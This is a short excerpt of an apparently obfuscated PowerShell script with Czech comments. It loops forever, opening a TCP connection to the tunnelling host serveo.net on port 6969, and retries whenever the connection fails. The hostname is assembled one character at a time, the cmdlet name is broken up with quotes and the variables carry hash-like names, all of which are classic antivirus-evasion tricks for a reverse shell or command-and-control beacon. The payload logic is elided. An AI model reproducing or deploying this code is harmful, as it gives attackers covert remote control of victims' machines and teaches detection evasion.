while($true){
    try{
        ...
        $4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c = 's'+'e'+'r'+'v'+'e'+'o'+'.'+'n'+'e'+'t';
        $port=6969;

        $948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d = n''ew''-OB''je''CT system.net.sockets.tcpclient($4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c,$port);
        ...
        # Zpracování chyby
        Write-Host "[-] Spojení selhalo: $_"
        try {
            # Zavřete existující spojení, pokud existuje
            if ($948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d -and $948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.Connected) {
                $948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.Close()
            }
        } catch {
            Write-Host "[-] Chyba při zavírání spojení: $_"
        }
